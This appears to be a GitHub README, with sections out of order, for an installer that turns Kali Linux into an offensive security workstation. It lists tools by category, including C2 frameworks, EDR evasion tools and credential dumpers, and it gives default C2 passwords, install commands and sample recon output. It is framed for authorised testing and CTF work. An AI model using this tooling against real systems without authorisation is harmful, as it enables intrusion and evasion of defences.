│   ├── merlin/                  # Merlin C2
│   └── NimPlant/                # NimPlant C2
├── usr/local/bin/               # All helper scripts + tool wrappers (107 tools)
├── root/
│   ├── .config/kali-master/
│   │   ├── secrets.env          # API keys (chmod 600)
│   │   ├── load_secrets.sh      # Auto-loader for secrets
│   │   ├── backups/             # System state backups
│   │   ├── profiles/            # Secret profiles
│   │   └── templates/           # Tool templates
│   ├── .kali-master/
│   │   └── state/               # Step completion state files
│   ├── .kali_env.zsh            # Environment variables + aliases (60+ aliases)
│   ├── .p10k.zsh                # Powerlevel10k theme config
│   ├── .oh-my-zsh/              # Oh-My-Zsh installation
│   │   └── custom/
│   │       ├── plugins/         # 7 Zsh plugins
│   │       └── themes/
│   │           └── powerlevel10k/
│   ├── .pwndbg/                 # pwndbg GDB plugin
│   ├── .gdbinit                 # GDB init (loads GEF)
│   └── .gf/                     # gf pattern library
├── home/
│   ├── go/bin/                  # Go tool binaries (29 tools)
│   ├── bugbounty/               # Bug Bounty workspaces
│   ├── ctf/                     # CTF workspaces
│   ├── redteam/
│   │   ├── ad/                  # AD engagement workspaces
│   │   └── operations/          # Red Team operation workspaces
│   └── payloads/                # Payload development workspaces
└── var/log/
    └── kali_master_v6_<date>.log  # Installation log
```

---

## 🛠️ Tool Categories (300+ Tools)

### 🐛 Bug Bounty (60+ tools)

**ProjectDiscovery Suite (18):**
```
subfinder, httpx, nuclei, dnsx, naabu, katana, interactsh-client, notify,
mapcidr, tlsx, shuffledns, asnmap, alterx, uncover, cvemap, pdtm, cloudlist, proxify
```

**Go Recon Tools (20):**
```
dalfox, gobuster, ffuf, trufflehog, gau, hakrawler, anew, qsreplace, gf,
waybackurls, assetfinder, httprobe, meg, unfurl, gospider, gron, dsieve,
getJS, subjs, chisel
```

**Python Bug Bounty (16):**
```
xsstrike, corsy, linkfinder, ssrfmap, jwt_tool, sublist3r, arjun, waymore,
dnsgen, dirsearch, commix, wfuzz, nomore403, cent, shosubgo, smuggler
```

**APT Security Tools (6):**
```
sqlmap, amass, whatweb, dirb, nikto, wpscan
```

**Cargo Tools (1):**
```
feroxbuster
```

---

### 🌐 Network & Active Directory (35+ tools)

**Core Network Tools:**
```
nmap, masscan, hydra, medusa, crackmapexec, evil-winrm, netexec (nxc),
responder, ettercap, bettercap, smbclient, smbmap, enum4linux, kerbrute, rpcclient
```

**AD Enumeration:**
```
bloodhound, neo4j, certipy-ad, ldeep, bloodyad, ldapdomaindump, donpapi,
ntlmrecon, pywhisker, targetedKerberoast, adidnsdump, manspider,
roastinthemiddle, windapsearch, silenthound, ADEnum
```

---

### 🔬 Reverse Engineering (30+ tools)

**Core RE:**
```
gdb, radare2, ghidra, rizin, cutter, imhex, binwalk, foremost, yara,
apktool, jadx, checksec
```

**Python RE:**
```
volatility3, flare-capa, flare-floss, pwntools, ROPgadget, ropper, pefile, r2pipe
```

**Ruby RE:**
```
one_gadget, seccomp-tools
```

**Malware Analysis:**
```
pe-sieve, hollows_hunter, nimcrypt2
```

---

### 🏆 CTF (25+ tools)

**Password Cracking:**
```
john, hashcat, hydra, medusa
```

**Steganography:**
```
steghide, stegseek, zsteg, outguess, stegoveritas, stegsolve, stegextract
```

**Forensics:**
```
binwalk, foremost, testdisk, photorec, autopsy, bulk_extractor, exiftool
```

**Cryptography:**
```
rsactftool, factordb-cli, ciphey, xortool, hash_extender, basecrack
```

**Web CTF:**
```
tplmap, dotdotpwn, aircrack-ng
```

---

### ☁️ Cloud Security (30+ tools)

**Container Security:**
```
trivy, grype, syft, dive, dockle
```

**Kubernetes:**
```
kubectl, kube-hunter, kubesec, krew, kubeaudit
```

**AWS Tools:**
```
aws cli, cloudfox, prowler, cloudmapper, enumerate-iam, principal-mapper
```

**Azure Tools:**
```
azure-cli, ROADtools, stormspotter, MicroBurst
```

**GCP Tools:**
```
gcloud cli, gcp-scanner
```

**Multi-Cloud:**
```
scoutsuite, pacu, cartography, cloud-nuke, cloud_enum
```

**Secrets Detection:**
```
gitleaks, trufflehog, git-hound
```

**IaC Security:**
```
checkov, tfsec, kics, terrascan
```

---

### 🎯 C2 Frameworks (8 frameworks)

```
sliver, havoc, mythic, covenant, empire, starkiller, merlin, nimplant
```

---

### 🛡️ EDR/AV Evasion (9 tools)

```
donut, scarecrow, sgn, freeze, inceptor, pezor, pe-sieve, hollows-hunter, nimcrypt2
```

---

### 💀 Post-Exploitation (35+ tools)

**Communication (8):**
```
netcat (nc), ncat, socat, telnet, rsh-client, proxychains4, tsh, cryptcat
```

**Linux Privilege Escalation (8):**
```
linpeas, pspy64, pspy32, linux-exploit-suggester, suid3num, linenum,
linuxprivchecker, laZagne.py
```

**Windows Privilege Escalation (7):**
```
winPEASx64, winPEASx86, winPEASany, PowerUp.ps1, SharpUp, Seatbelt, laZagne.exe
```

**Credential Dumping (5):**
```
mimikatz, Rubeus, SafetyKatz, laZagne.exe, laZagne.py
```

**Tunneling & Pivoting (4):**
```
chisel, ligolo-ng, rpivot, ssf
```

**Python Post-Exploit (3):**
```
gtfobins-search, beroot, smbmap
```

---

## 🔑 Credentials Reference

| Framework | Username | Password | URL |
|-----------|----------|----------|-----|
| **Mythic** | mythic_admin | Admin123! | https://127.0.0.1:7443 |
| **Havoc** | 5pider | password1234 | — |
| **Covenant** | (create on first login) | — | https://127.0.0.1:7443 |
| **Empire** | empireadmin | password123 | — |
| **Merlin** | — | merlin | — |

**Note:** Credentials can be changed in:
- Mythic: `/opt/Mythic/.env`
- Havoc: `/opt/Havoc/profiles/havoc.yaotl`

---

## ⚖️ Legal Notice

> **This tool is intended exclusively for:**
> - Authorized penetration testing engagements with written permission
> - Legal CTF competitions and training platforms (HackTheBox, TryHackMe, HackMyVM, CTFd, PicoCTF, etc.)
> - Academic security research in isolated lab environments
> - Personal learning and skill development on systems you own or have explicit permission to test
>
> **Unauthorized use of this tool against systems you do not own or lack explicit permission to test is illegal under computer fraud and abuse laws in most jurisdictions.**
>
> The author assumes no liability for any misuse of this software. By using this tool, you agree to use it only in legal, authorized contexts.

---

## 👤 Author

**vulnquest58**

[![GitHub](https://img.shields.io/badge/GitHub-vulnquest58-181717?style=for-the-badge&logo=github)](https://github.com/vulnquest58)

> *"The quieter you become, the more you are able to hear."*

---

<div align="center">

**Kali Master Framework v6.7.0** — Built for the elite. Used responsibly.

[Report an Issue](https://github.com/vulnquest58/kali-master-framework/issues) · [Star the Repo](https://github.com/vulnquest58/kali-master-framework)

</div>- [What's New in v6.7.0](#whats-new-in-v670)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Modes](#modes)
- [Installation Output Example](#installation-output-example)
- [Steps Reference (25 Steps)](#steps-reference-25-steps)
- [Helper Scripts (17 Scripts)](#helper-scripts-17-scripts)
  - [bb-recon — Bug Bounty Recon](#1-bb-recon--bug-bounty-recon)
  - [sub-enum — Subdomain Enumeration](#2-sub-enum--subdomain-enumeration)
  - [api-recon — API Reconnaissance](#3-api-recon--api-reconnaissance)
  - [cloud-recon — Cloud Enumeration](#4-cloud-recon--cloud-enumeration)
  - [port-scan — Port Scanner](#5-port-scan--port-scanner)
  - [dir-fuzz — Directory Fuzzer](#6-dir-fuzz--directory-fuzzer)
  - [vuln-scan — Vulnerability Scanner](#7-vuln-scan--vulnerability-scanner)
  - [newbb — Bug Bounty Workspace](#8-newbb--bug-bounty-workspace)
  - [newctf — CTF Workspace](#9-newctf--ctf-workspace)
  - [newad — AD Workspace](#10-newad--ad-workspace)
  - [newpayload — Payload Workspace](#11-newpayload--payload-workspace)
  - [newredteam — Red Team Operation](#12-newredteam--red-team-operation)
  - [setup-redirector — C2 Redirector](#13-setup-redirector--c2-redirector)
  - [evasion-menu — EDR Evasion](#14-evasion-menu--edr-evasion)
  - [postexploit-menu — Post-Exploitation](#15-postexploit-menu--post-exploitation)
  - [lab-manager — Docker Labs](#16-lab-manager--docker-labs)
  - [c2-menu — C2 Launcher](#17-c2-menu--c2-launcher)
  - [pe-server — HTTP Server](#18-pe-server--http-server)
  - [pe-transfer — File Transfer](#19-pe-transfer--file-transfer)
  - [revshell — Reverse Shell Generator](#20-revshell--reverse-shell-generator)
  - [secrets-manager — API Keys](#21-secrets-manager--api-keys)
  - [update-tools — Update Manager](#22-update-tools--update-manager)
  - [kali-master — Dashboard](#23-kali-master--dashboard)
  - [check_tools_status — Tool Status](#24-check_tools_status--tool-status)
  - [helper-menu — Interactive Menu](#25-helper-menu--interactive-menu)
- [Directory Structure](#directory-structure)
- [Tool Categories (300+ Tools)](#tool-categories-300-tools)
- [Credentials Reference](#credentials-reference)
- [Legal Notice](#legal-notice)
- [Author](#author)

---

## 🎯 Overview

**Kali Master Framework v6.7.0** is a fully automated, single-file Bash script that transforms a fresh Kali Linux installation into a complete offensive security workstation. It is designed for practitioners who work across multiple disciplines simultaneously — bug bounty, red teaming, reverse engineering, competitive CTF platforms, Active Directory attacks, cloud security, and EDR evasion.

### ✨ Key Features

- **🔄 State Machine** — Every step is tracked; re-running the script skips completed steps automatically
- **⏱️ Auto-calculated ETA** — Real-time progress with estimated time remaining displayed at each step
- **🔧 Three-tier Fallback** — Every tool attempts installation via `apt → pip/go/cargo → GitHub release` before failing
- **🛠️ Universal Auto-Fix Engine** — Automatically detects and repairs 68+ missing tools after installation
- **🛡️ OPSEC-ready** — C2 redirector automation with Nginx + Let's Encrypt SSL built in
- **🎭 EDR Evasion Suite** — Donut, ScareCrow, SGN, Freeze, Inceptor, Pezor, PE-Sieve, Hollows Hunter, Nimcrypt2
- **🏢 Advanced AD Attacks** — certipy-ad, pywhisker, targetedKerberoast, ldeep, windapsearch
- **☁️ Cloud Security** — pacu, cloudfox, scoutsuite, gitleaks, trivy, grype, syft
- **🎯 C2 Frameworks** — Sliver, Havoc, Mythic, Covenant, Empire, Starkiller, Merlin, NimPlant
- **🐳 Docker Labs** — 30 vulnerable labs across 8 categories
- **📊 Professional Dashboard** — 11 commands for system management
- **📦 Single File** — No external dependencies, no Ansible, no Docker orchestration required

---

## 🆕 What's New in v6.7.0

### 🎉 Major Additions (36+ New Tools)

| Category | New Tools |
|----------|-----------|
| **Bug Bounty** | `ghauri` (advanced SQLi), `nomore403` (403 bypass), `smuggler` (HTTP smuggling), `cent` (nuclei templates manager), `cloud_enum` (cloud enumeration), `shosubgo` (Shodan subdomains), `github-dorker` |
| **Active Directory** | `certipy-ad` (AD CS exploitation), `pywhisker` (AD CS attacks), `targetedKerberoast`, `ldeep` (LDAP enumeration), `windapsearch` (Go-based AD search) |
| **Evasion** | `Freeze` (payload obfuscation), `Inceptor` (AV/EDR bypass), `Pezor` (PE packer) + **Fixed**: ScareCrow (Garble + ScareCrow.go), SGN (keystone-engine + libkeystone.so) |
| **Reverse Engineering** | `ImHex` (hex editor), `pwninit` (CTF binary patcher), `rizin`, `cutter` |
| **Cloud Security** | `pacu` (AWS exploitation), `cloudfox` (cloud enumeration), `scoutsuite` (multi-cloud auditing), `gitleaks` (secrets detection) |
| **Post-Exploitation** | `mimikatz`, `Rubeus`, `SharpUp` (Windows), `gtfobins-search`, `beroot` (Linux) |
| **CTF** | `factordb-cli`, `ciphey` (auto decode), `volatility2`, `heapinspect` |

### 🛠️ Critical Bug Fixes

- ✅ **Merlin**: Direct symlinks (no build needed)
- ✅ **ScareCrow**: Garble + `ScareCrow.go` build
- ✅ **SGN**: keystone-engine + libkeystone.so + `go build .`
- ✅ **Certbot**: Symlink + apt fallback
- ✅ **smart_find_tool()**: Case-insensitive search across 7 paths
- ✅ **TOOL_INSTALL_MAP**: Safe lookup with `:-` to prevent unbound variable errors
- ✅ **update-tools**: Fixed arithmetic errors in package counting

### 🆕 New Helper Scripts (17 Scripts)

- `api-recon` — API reconnaissance
- `cloud-recon` — Cloud enumeration
- `port-scan` — Port scanner (5 profiles)
- `dir-fuzz` — Directory fuzzer
- `vuln-scan` — Vulnerability scanner
- `newredteam` — Red Team operation workspace
- `pe-server` — Dynamic HTTP server
- `pe-transfer` — Quick file transfer
- `revshell` — Reverse shell generator (9 types)
- `secrets-manager` — API keys manager
- `check_tools_status` — Tool status checker
- `helper-menu` — Interactive helper menu
- `notify-recon` — Notification sender
- `merge-results` — Scan results merger

### 🆕 New Dashboard Commands

- `kali-master certipy` — AD CS commands overview
- `kali-master cloud` — Cloud tools overview
- `kali-master evasion` — Evasion toolkit
- `kali-master postex` — Post-exploitation kit

---

## 📋 Requirements

| Requirement | Minimum | Recommended |
|------------|---------|-------------|
| **OS** | Kali Linux 2023.x | Kali Linux 2026.x (latest) |
| **RAM** | 4 GB | 8 GB+ |
| **Disk** | 15 GB free | 40 GB+ free |
| **Network** | Required | Stable broadband |
| **Privileges** | root | root |
| **Architecture** | x86_64 | x86_64 |

---

## 📥 Installation

```bash
# Clone or download the script
git clone https://github.com/vulnquest58/kali-master-framework.git
cd kali-master-framework

# Make executable
chmod +x kali_master_v6.7.0.sh

# Full installation (recommended)
sudo bash kali_master_v6.7.0.sh

# Lightweight install (core tools only)
sudo bash kali_master_v6.7.0.sh --minimal

# Run auto-fix only (repair missing tools)
sudo bash kali_master_v6.7.0.sh --fix

# Run specific step
sudo bash kali_master_v6.7.0.sh --step redteam_c2 --force

# With GitHub token (avoids rate limits)
GITHUB_TOKEN=ghp_xxx sudo bash kali_master_v6.7.0.sh
```

---

## 🎮 Usage

```
Usage: kali_master_v6.7.0.sh [OPTIONS]

Options:
  (no options)         Full installation — all 25 steps
  --minimal            Minimal install — core tools only
  --fix                Auto-fix missing tools only, no full install
  --step <name>        Run a single step only (idempotent)
  --reset <name>       Reset state for one step so it re-runs
  --reset-all          Reset all step states (full re-run)
  --force              Force re-run of all steps regardless of state
  --help, -h           Show this help message

Available Steps:
   1. network_fix       2. snapshot           3. system_update
   4. python_venv       5. golang             6. docker
   7. bugbounty         8. reversing          9. ctf
  10. ad_network       11. cloud_security    12. wordlists
  13. shell_config     14. secrets           15. vm_hardening
  16. update_manager   17. helper_scripts    18. redteam_c2
  19. c2_redirector    20. evasion_tools     21. post_exploit
  22. lab_manager      23. c2_menu           24. auto_fix
  25. dashboard

Examples:
  sudo bash kali_master_v6.7.0.sh --step bugbounty
  sudo bash kali_master_v6.7.0.sh --reset redteam_c2 --step redteam_c2
  sudo bash kali_master_v6.7.0.sh --force
  GITHUB_TOKEN=ghp_xxx sudo bash kali_master_v6.7.0.sh
```

---

## 🎛️ Modes

### Full Mode (default)

Installs all 25 steps including C2 frameworks, EDR evasion tools, post-exploitation kit, AD attack tools, cloud security, and redirector automation.

```bash
sudo bash kali_master_v6.7.0.sh
```

### Minimal Mode

Installs only core dependencies, Go, Python venv, and essential network tools. Skips Docker, reversing tools, CTF extras, C2 frameworks, evasion tools, and post-exploit kit.

```bash
sudo bash kali_master_v6.7.0.sh --minimal
```

### Fix Mode

Scans for missing or broken tools and attempts repair using the three-tier fallback engine. Does not re-run any installation steps.

```bash
sudo bash kali_master_v6.7.0.sh --fix
```

---

## 📺 Installation Output Example

### Full Installation Output

```
╔═══════════════════════════════════════════════════════╗
║   KALI MASTER FRAMEWORK v6.7.0                        ║
║   Ultimate Offensive Security Platform                ║
╚═══════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════
  PRE-FLIGHT CHECKS
═══════════════════════════════════════════════════════
  [✔] Kali Linux detected
  [✔] Root confirmed
  [✔] Internet active
  [✔] Disk: 50GB free
  [✔] RAM: 16GB

═══════════════════════════════════════════════════════
  ▶ STEP 1/25 — NETWORK FIX
═══════════════════════════════════════════════════════
  [*] Hardening network / DNS...
  [✔] IPv6 disabled
  [✔] DNS fallbacks added (1.1.1.1, 8.8.8.8)
  [✔] apt forced to IPv4
  [✔] GOPROXY configured

═══════════════════════════════════════════════════════
  ▶ STEP 7/25 — BUG BOUNTY TOOLS
═══════════════════════════════════════════════════════
  [*] Installing ProjectDiscovery Suite...
    [✔] subfinder [installed]
    [✔] httpx [installed]
    [✔] nuclei [installed]
    [✔] dnsx [installed]
    ... (14 more)
  [✔] ProjectDiscovery suite: 18/18 ready

  [*] Installing other Go tools...
    [✔] dalfox [installed]
    [✔] gobuster [installed]
    [✔] ffuf [installed]
    ... (17 more)
  [✔] Go tools: 20/20 ready

  [*] Installing Python tools...
    [✔] xsstrike [installed]
    [✔] corsy [installed]
    [✔] linkfinder [installed]
    ... (8 more)
  [✔] Python tools: 11/11 ready

═══════════════════════════════════════════════════════
  ▶ STEP 18/25 — RED TEAM C2 FRAMEWORKS
═══════════════════════════════════════════════════════
  [*] Installing Sliver C2...
    [✔] Sliver [installed]

  [*] Building Havoc C2...
    [✔] Teamserver built
    [✔] Client built
    [✔] Havoc [built and ready]

  [*] Setting up Mythic C2...
    [*] Resetting Mythic database (safe)...
    [*] Starting Mythic...
    [✔] Mythic [running]
  [*] Login: mythic_admin / Admin123!

  [*] Building Covenant C2...
    [*] Installing libssl1.1...
    [*] Building Covenant...
    [✔] Covenant [ready]

  ... (4 more frameworks)

  [✔] C2 tools verified: 8/8

═══════════════════════════════════════════════════════
  ▶ STEP 20/25 — POST-EXPLOITATION KIT
═══════════════════════════════════════════════════════
  [PHASE 1/11] CORE COMMUNICATION TOOLS
    [✔] netcat-openbsd [installed]
    [✔] ncat [installed]
    [✔] socat [installed]
    ... (5 more)
  [✔] Communication tools: 8/8 ready

  [PHASE 2/11] LINUX PRIVILEGE ESCALATION
    [*] Downloading linpeas.sh...
    [✔] linpeas.sh [downloaded]
    [*] Downloading pspy64...
    [✔] pspy64 [downloaded]
    ... (6 more)
  [✔] Linux PE tools: 8/8 ready

  [PHASE 7/11] DYNAMIC HTTP SERVER
    [✔] pe-server [created]

  [PHASE 10/11] REVERSE SHELL GENERATOR
    [✔] revshell [created]

  [✔] Post-exploitation tools verified: 6/6

═══════════════════════════════════════════════════════
  FINAL HEALTH CHECK
═══════════════════════════════════════════════════════
  [PHASE 2/7] SCANNING TOOLS BY CATEGORY

  [Bug Bounty Tools] (28 tools)
    [✔] nuclei → /usr/local/bin/nuclei
    [✔] subfinder → /usr/local/bin/subfinder
    ... (26 more)
    Category Status: 28/28 (100%)

  [C2 Frameworks] (8 tools)
    [✔] sliver-server → /usr/local/bin/sliver-server
    [✔] havoc → /usr/local/bin/havoc
    ... (6 more)
    Category Status: 8/8 (100%)

  CATEGORY BREAKDOWN
    ✔ Bug Bounty Tools: 28/28 (100%)
    ✔ Network & Exploitation: 10/10 (100%)
    ✔ Reverse Engineering: 16/16 (100%)
    ✔ C2 Frameworks: 8/8 (100%)
    ✔ Cloud Security: 5/5 (100%)
    ✔ EDR/AV Evasion: 7/7 (100%)
    ✔ Post-Exploitation: 4/4 (100%)
    ✔ Active Directory: 4/4 (100%)
    ✔ Runtimes & Core: 7/7 (100%)

  OVERALL STATUS
    [████████████████████████████████████████████████████] 100%

═══════════════════════════════════════════════════════
  🎉 KALI MASTER FRAMEWORK v6.7.0 — READY FOR ACTION! 🎉
═══════════════════════════════════════════════════════

  Duration:       58m 34s
  Total Checked:  106 items
  Passed:         106 items
  Failed:         0 items
  Success Rate:   100%

  🎉 All tools are installed!

  Quick Commands:
    kali-master status       → Show dashboard
    c2-menu                  → C2 launcher
    lab-manager              → Lab manager
    postexploit-menu         → Post-exploitation menu
    evasion-menu             → Evasion toolkit
```

### Final Summary Output

```
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║            ██╗  ██╗ █████╗ ██╗     ██╗                  ║
║            ██║ ██╔╝██╔══██╗██║     ██║                 ║
║            █████╔╝ ███████║██║     ██║                ║
║            ██╔═██╗ ██╔══██║██║     ██║                 ║
║            ██║  ██╗██║  ██║███████╗██║                 ║
║            ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝                ║
║                                                       ║
║   ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗   ║
║   ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗  ║
║   ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝  ║
║   ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗  ║
║   ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║    ║   
║   ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ║
║                                                           ║
║                 INSTALLATION COMPLETE! 🎉                 ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝

  INSTALLATION INFO
  ────────────────────────────────────────────────────────
  Version:       Kali Master Framework v6.7.0
  Duration:      58m 34s
  Log File:      /var/log/kali_master_v6_20260604_172426.log
  Completed:     2026-06-04 18:27:02

  STATISTICS
  ────────────────────────────────────────────────────────
  ● /usr/local/bin:     107 tools
  ● Go binaries:        29 tools
  ● Cargo binaries:     1 tools
  ● Python packages:    289 packages
  ● C2 frameworks:      7 frameworks
  ● Post-exploit files: 105 files
  ● Evasion tools:      5 tools
  ● Total disk usage:   1.1G + 770M + 1052.2M

  🚀 NEXT STEPS
  ────────────────────────────────────────────────────────
    1. Open a new terminal to activate all tools
    2. Run p10k configure to customize your shell
    3. Configure API keys: secrets-manager
    4. Check status: kali-master status
    5. Start exploring: c2-menu or lab-manager

═══════════════════════════════════════════════════════
  🎉 KALI MASTER FRAMEWORK v6.7.0 — READY FOR ACTION! 🎉
═══════════════════════════════════════════════════════

  Thank you for using Kali Master Framework!
  Happy hacking! 🚀
```

---

## 📊 Steps Reference (25 Steps)

The script executes **25 ordered steps**. Step count and ETA are calculated automatically at runtime.

| # | Step Name | Description | Tools Installed |
|---|-----------|-------------|-----------------|
| 1 | `network_fix` | DNS hardening, IPv6 toggle, GOPROXY setup, apt force IPv4 | — |
| 2 | `snapshot` | VMware detection, Timeshift snapshot | — |
| 3 | `system_update` | apt upgrade + 60+ build dependencies | 60+ packages |
| 4 | `python_venv` | Central venv, angr venv, FLARE venv, 30+ pip packages | 289 packages |
| 5 | `golang` | Latest Go release auto-detection and install | Go 1.26.4 |
| 6 | `docker` | Docker CE + BuildX + Compose plugin | Docker CE |
| 7 | `bugbounty` | 45+ tools: ProjectDiscovery suite, tomnomnom tools, XSStrike, ghauri, smuggler... | 60+ tools |
| 8 | `reversing` | GDB + pwndbg/GEF/PEDA, Ghidra, radare2, rizin, cutter, angr, FLARE, ImHex, pwninit | 30+ tools |
| 9 | `ctf` | CTF-specific: john, hashcat, RSACtfTool, steghide, stegseek, ciphey, factordb-cli... | 25+ tools |
| 10 | `ad_network` | AD: BloodHound, Impacket, CrackMapExec, evil-winrm, kerbrute, certipy-ad, pywhisker, ldeep, windapsearch... | 35+ tools |
| 11 | `cloud_security` | trivy, grype, syft, kubectl, AWS CLI, pacu, cloudfox, scoutsuite, gitleaks | 30+ tools |
| 12 | `wordlists` | SecLists, rockyou, kali wordlists | 15+ lists |
| 13 | `shell_config` | zsh + Oh-My-Zsh + Powerlevel10k + plugins | 7 plugins |
| 14 | `secrets` | Secrets manager scaffold (API keys storage) | 40+ variables |
| 15 | `vm_hardening` | sysctl tuning: ptrace, file-max, somaxconn | — |
| 16 | `update_manager` | `update-tools` script (18-step updater) | 1 script |
| 17 | `helper_scripts` | `bb-recon`, `newbb`, `newctf`, `newad`, `newpayload` workspace helpers | 17 scripts |
| 18 | `redteam_c2` | Sliver, Havoc, Mythic, Covenant, Empire, Starkiller, Merlin, NimPlant | 8 frameworks |
| 19 | `c2_redirector` | Nginx + Let's Encrypt C2 redirector automation | Nginx + Certbot |
| 20 | `evasion_tools` | Donut, ScareCrow, SGN, Freeze, Inceptor, Pezor, PE-Sieve, Hollows Hunter, Nimcrypt2 | 9 tools |
| 21 | `post_exploit` | linpeas, winpeas, chisel, pspy, ligolo-ng, mimikatz, Rubeus, SharpUp, gtfobins-search, beroot | 35+ tools |
| 22 | `lab_manager` | Docker lab manager: 30 labs across 8 categories | 30 labs |
| 23 | `c2_menu` | Interactive C2 launcher with status dashboard | 1 script |
| 24 | `auto_fix` | Universal auto-fix engine (68+ tools) | — |
| 25 | `dashboard` | `kali-master` command dashboard (11 commands) | 1 script |

---

## 🛠️ Helper Scripts (17 Scripts)

All helper scripts are installed to `/usr/local/bin/` and available system-wide after installation.

---

### 1. bb-recon — Bug Bounty Recon

Automated reconnaissance pipeline for a target domain with 12 steps.

```bash
bb-recon <domain> [--deep|--quick|--passive]

# Examples
bb-recon example.com
bb-recon example.com --deep
bb-recon example.com --passive --notify
```

#### Output Example

```
██████╗ ██████╗       ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔══██╗██╔══██╗      ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██████╔╝██████╔╝█████╗██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██╔══██╗██╔══██╗╚════╝██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
██████╔╝██████╔╝      ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
╚═════╝ ╚═════╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
  Professional Bug Bounty Reconnaissance — v2.0
  OWASP Testing Guide + Bug Bounty Hunter Methodology
  ────────────────────────────────────────────────────────

  Target: example.com
  Mode:   deep
  Output: /root/bugbounty/example.com/recon_20260604_190831

  [*] Starting recon in 3 seconds... (Ctrl+C to cancel)

═══════════════════════════════════════════════════════
  ▶ STEP 1/12 — PASSIVE SUBDOMAIN ENUMERATION
═══════════════════════════════════════════════════════
  [*] Running Subfinder...
  [✔] Subfinder: 1,234 subdomains
  [*] Running Assetfinder...
  [✔] Assetfinder: 856 subdomains
  [*] Running Amass (passive)...
  [✔] Amass: 2,100 subdomains

  [✔] Total passive subdomains: 3,456

═══════════════════════════════════════════════════════
  ▶ STEP 3/12 — HTTP PROBING (httpx)
═══════════════════════════════════════════════════════
  [*] Probing live hosts...
  [✔] Live hosts: 1,890

═══════════════════════════════════════════════════════
  ▶ STEP 8/12 — VULNERABILITY SCANNING (Nuclei)
═══════════════════════════════════════════════════════
  [*] Running nuclei (severity: low,medium,high,critical)...
  [✔] Vulnerabilities found: 45

  Breakdown by severity:
    • critical: 3
    • high: 12
    • medium: 18
    • low: 8
    • info: 4

═══════════════════════════════════════════════════════
  RECONNAISSANCE COMPLETE
═══════════════════════════════════════════════════════

  Target:    example.com
  Mode:      deep
  Duration:  15m 23s
  Output:    /root/bugbounty/example.com/recon_20260604_190831

  Results:
    • Subdomains:     3,456
    • Live Hosts:     1,890
    • URLs:           12,345
    • JS Files:       234
    • Vulnerabilities: 45

  ⚠ Review vulnerabilities in: .../vulns/nuclei.txt
```

**Output location:**
```
~/bugbounty/<domain>/recon_YYYYMMDD_HHMM/
├── subdomains/          # Subdomain enumeration results
│   ├── passive.txt
│   ├── subfinder.txt
│   ├── assetfinder.txt
│   ├── amass.txt
│   ├── resolved.txt
│   └── all.txt
├── http/                # HTTP probing results
│   ├── alive.txt
│   ├── urls.txt
│   └── status_*.txt
├── ports/               # Port scan results
├── urls/                # URL discovery results
│   ├── gau.txt
│   ├── wayback.txt
│   ├── katana.txt
│   └── all_urls.txt
├── js/                  # JavaScript analysis
│   ├── js_files.txt
│   ├── endpoints.txt
│   └── subjs.txt
├── params/              # Parameter discovery
│   ├── arjun.txt
│   ├── xss.txt
│   ├── ssti.txt
│   └── ssrf.txt
├── vulns/               # Vulnerability findings
│   ├── nuclei.txt
│   ├── dalfox.txt
│   └── cors.json
└── report.md            # Final report
```

---

### 2. sub-enum — Subdomain Enumeration

Professional subdomain enumeration with 5 tools.

```bash
sub-enum <domain>

# Example
sub-enum example.com
```

#### Output Example

```
  [*] Target: example.com
  [*] Output: /root/subdomains/example.com/20260604_190831

  [1/5] Subfinder...
  [✔] 1,234 subdomains
  [2/5] Assetfinder...
  [✔] 856 subdomains
  [3/5] Amass (passive)...
  [✔] 2,100 subdomains
  [4/5] Resolving with dnsx...
  [✔] 3,200 resolved
  [5/5] HTTP probing...
  [✔] 1,890 live hosts

═══════════════════════════════════════════════════════
  ENUMERATION COMPLETE
═══════════════════════════════════════════════════════
  Total:  3,456 subdomains
  Output: /root/subdomains/example.com/20260604_190831/
```

---

### 3. api-recon — API Reconnaissance

API reconnaissance and endpoint discovery.

```bash
api-recon <url> [--deep|--quick]

# Example
api-recon https://api.example.com --deep
```

#### Output Example

```
  [*] Target: https://api.example.com
  [*] Output: /root/api-recon/api_example_com_20260604_190831

  [1/5] Discovering API endpoints...
  [✔] Found 234 API endpoints

  [2/5] Checking for API documentation...
  [✔] Found: swagger.json
  [✔] Found: openapi.json

  [3/5] Testing authentication...
  [✔] Tested 20 endpoints

  [4/5] Discovering parameters...
  [✔] Found 45 parameters

  [5/5] Generating report...

  [✔] API Recon Complete
  [✔] Results: /root/api-recon/api_example_com_20260604_190831/
```

---

### 4. cloud-recon — Cloud Enumeration

Cloud infrastructure enumeration for AWS, Azure, and GCP.

```bash
cloud-recon <target> [aws|azure|gcp|all]

# Examples
cloud-recon example.com aws
cloud-recon example.com all
```

#### Output Example

```
  [*] Target: example.com
  [*] Provider: all
  [*] Output: /root/cloud-recon/example.com_20260604_190831

  [1/4] AWS Enumeration...
  [✔] AWS CLI configured
  [✔] Found 12 S3 buckets

  [2/4] Azure Enumeration...
  [✔] Azure CLI configured
  [✔] Found 8 storage accounts

  [3/4] GCP Enumeration...
  [✔] GCloud CLI configured
  [✔] Found 5 buckets

  [4/4] Generating report...

  [✔] Cloud Recon Complete
  [✔] Results: /root/cloud-recon/example.com_20260604_190831/
```

---

### 5. port-scan — Port Scanner

Professional port scanner with 5 profiles.

```bash
port-scan <target> [profile]

# Profiles: quick, standard, full, vuln, stealth

# Examples
port-scan 10.0.0.1 quick
port-scan 10.0.0.1 full
port-scan 10.0.0.1 vuln
```

#### Output Example

```
